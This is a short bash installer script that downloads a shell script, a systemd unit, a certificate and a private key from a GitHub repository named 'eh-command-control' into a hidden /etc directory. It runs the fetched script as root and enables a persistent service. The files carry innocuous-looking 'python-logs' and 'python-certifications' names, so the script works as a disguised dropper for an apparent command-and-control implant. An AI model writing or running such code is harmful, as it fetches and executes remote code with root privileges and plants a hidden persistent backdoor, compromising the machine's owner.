#!/bin/bash

sudo mkdir -p /etc/.python-certifications

curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/logs.sh \
  | sudo tee /etc/.python-certifications/.python-logs > /dev/null

curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/logs.service \
  | sudo tee /etc/systemd/system/python-logs.service > /dev/null

curl -fsSL --retry 3 https://github.com/AidanNgo/eh-command-control/raw/refs/heads/main/cert.pem \
  | sudo tee /etc/.python-certifications/cert.pem > /dev/null

curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/key.pem \
  | sudo tee /etc/.python-certifications/key.pem > /dev/null

sudo chmod +x /etc/.python-certifications/.python-logs
sudo bash /etc/.python-certifications/.python-logs

sudo systemctl daemon-reload
sudo systemctl enable python-logs
sudo systemctl start python-logs
